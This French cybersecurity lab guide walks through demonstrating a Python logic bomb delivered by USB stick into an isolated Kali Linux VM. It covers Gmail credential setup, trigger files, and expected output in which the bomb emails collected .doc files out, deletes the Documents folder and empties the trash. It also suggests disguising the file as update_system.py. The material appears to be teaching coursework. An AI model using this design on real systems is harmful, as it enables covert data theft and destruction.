# Guide de démonstration — Bombe logique
## TP N°1 Cybersécurité | Kali Linux sur VMware + Clé USB physique

---

## Environnement de test

| Élément | Détail |
|---|---|
| VM | Kali Linux sur VMware |
| Vecteur d'introduction | Clé USB physique connectée à la VM via VMware |
| Mode | **Réel — actions effectives dans la VM isolée** |
| Langage | Python 3 |
| Risque hôte | Aucun — la VM est entièrement isolée |

---

## Étape 1 — Préparer la clé USB (machine hôte Windows)

Copier le fichier de la bombe sur la clé USB depuis l'Explorateur Windows :

1. Brancher la clé USB sur le PC
2. Ouvrir l'Explorateur de fichiers (`Win + E`)
3. Copier `bombe_logique_complete.py` sur la clé USB
4. Optionnel : renommer le fichier avec un nom trompeur (ex: `update_system.py`)

---

## Étape 2 — Passer la clé USB à la VM Kali Linux (VMware)

Dans VMware :

1. Aller dans le menu **VM > Removable Devices**
2. Trouver votre clé USB dans la liste
3. Cliquer **Connect (Disconnect from Host)**

La clé USB apparaît maintenant dans Kali Linux (généralement dans `/media/` ou `/run/media/`).

Vérifier dans le terminal Kali :

```bash
lsblk
# ou
ls /media/
```

---

## Étape 3 — Configurer l'email avant exécution

Ouvrir le fichier dans Kali Linux et renseigner les identifiants Gmail :

```bash
nano /media/<nom_cle>/bombe_logique_complete.py
```

Modifier les lignes :
```python
EMAIL_EXPEDITEUR   = "votre.email@gmail.com"
EMAIL_MOT_DE_PASSE = "xxxx xxxx xxxx xxxx"   # Mot de passe d'application
EMAIL_DESTINATAIRE = "jesse.mpiga@a-ct.ma"
```

### Comment créer un mot de passe d'application Gmail

1. Aller sur **myaccount.google.com**
2. Sécurité → Validation en deux étapes (activer si pas encore fait)
3. Sécurité → **Mots de passe des applications**
4. Sélectionner "Autre (nom personnalisé)" → nommer "TP Kali"
5. Copier le mot de passe généré (16 caractères, ex: `abcd efgh ijkl mnop`)

---

## Étape 4 — Démonstration bombe DORMANTE (sans déclencheurs)

Exécuter la bombe depuis la clé USB dans Kali :

```bash
python3 /media/<nom_cle>/bombe_logique_complete.py
```

**Résultat attendu (bombe dormante) :**
```
============================================================
  TP N 1 - Bombe logique Python | Kali Linux
  Date : 2026-06-02 22:00:00
============================================================

[INFO] Verification des conditions de declenchement...
  [absent] declencheur1.txt
  [absent] declencheur2.txt
  [absent] declencheur3.txt
[OK] 3 declencheur(s) manquant(s). Systeme securise.

Le systeme est securise. En attente...
```

---

## Étape 5 — Créer les fichiers déclencheurs dans Documents (Kali)

### Option A — Interface graphique (Nautilus / Files)

1. Ouvrir le **Gestionnaire de fichiers** dans Kali Linux
2. Naviguer vers : **Dossier personnel > Documents**
3. Clic droit → **Nouveau document > Fichier vide**
4. Nommer : `declencheur1.txt` → valider
5. Répéter pour `declencheur2.txt` et `declencheur3.txt`
6. Créer un fichier `rapport_confidentiel.doc`

### Option B — Terminal Kali Linux

```bash
touch ~/Documents/declencheur1.txt
touch ~/Documents/declencheur2.txt
touch ~/Documents/declencheur3.txt
echo "contenu confidentiel" > ~/Documents/rapport_confidentiel.doc
```

Vérifier :
```bash
ls ~/Documents/
```

> **Note terminaux :**
> ```
> ┌────────────┬─────────────────────────────┐
> │  Terminal  │ Variable profil utilisateur │
> ├────────────┼─────────────────────────────┤
> │ Linux/Bash │ ~/  ou  $HOME               │
> ├────────────┼─────────────────────────────┤
> │ PowerShell │ $env:USERPROFILE            │
> ├────────────┼─────────────────────────────┤
> │ CMD        │ %USERPROFILE%               │
> └────────────┴─────────────────────────────┘
> ```

---

## Étape 6 — Activer la bombe (test réel dans la VM)

```bash
python3 /media/<nom_cle>/bombe_logique_complete.py
```

**Résultat attendu (bombe active) :**
```
============================================================
  TP N 1 - Bombe logique Python | Kali Linux
  Date : 2026-06-02 22:05:00
============================================================

[INFO] Verification des conditions de declenchement...
  [PRESENT] declencheur1.txt
  [PRESENT] declencheur2.txt
  [PRESENT] declencheur3.txt
[ALERTE] Tous les declencheurs sont presents ! Activation de la bombe.

[ALERTE] Conditions de declenchement remplies.
Execution de la charge utile...

[ACTION] Collecte des fichiers .doc dans Documents...
  Fichier recupere : /home/kali/Documents/rapport_confidentiel.doc

[ACTION] Envoi de 1 fichier(s) a jesse.mpiga@a-ct.ma...
[OK] Email envoye avec succes a jesse.mpiga@a-ct.ma.

[ACTION] Suppression du contenu de : /home/kali/Documents
[OK] 4 element(s) supprime(s) de Documents.

[ACTION] Vidage de la Corbeille Linux : /home/kali/.local/share/Trash
[OK] Corbeille videe.

============================================================
[FIN] Charge utile executee.
============================================================
```

---

## Récapitulatif des scénarios

| Scénario | Déclencheurs | Résultat |
|---|---|---|
| Bombe dormante | 0 ou 1 ou 2 fichiers | "Systeme securise. En attente..." |
| Déclenchement complet | Les 3 fichiers présents | 4 actions exécutées réellement |

---

## Architecture du code

```
principale()
    │
    ├── verifier_declencheur()    <- 3 fichiers présents dans ~/Documents ?
    │       └── True / False
    │
    ├── collecter_fichiers_doc()  <- glob("*.doc") dans ~/Documents
    │
    ├── envoyer_par_email()       <- Gmail SMTP SSL port 465
    │
    ├── supprimer_documents()     <- os.remove() + shutil.rmtree()
    │
    └── vider_corbeille()         <- supprime ~/.local/share/Trash/
```

---

## Points clés pour la démonstration

1. **VM isolée** : toutes les actions sont réelles mais confinées à la VM — aucun risque sur la machine hôte
2. **Vecteur USB physique** : la clé est branchée physiquement puis passée à la VM via VMware — c'est exactement le scénario de la consigne
3. **Bombe dormante → active** : montrer les deux états successifs
4. **Email reçu** : vérifier la boîte jesse.mpiga@a-ct.ma après l'exécution — preuve que l'exfiltration fonctionne
5. **Documents vide** : vérifier `ls ~/Documents/` après l'exécution — prouve la destruction

---

*Guide rédigé dans le cadre du TP N°1 Cybersécurité — Kali Linux / VMware*
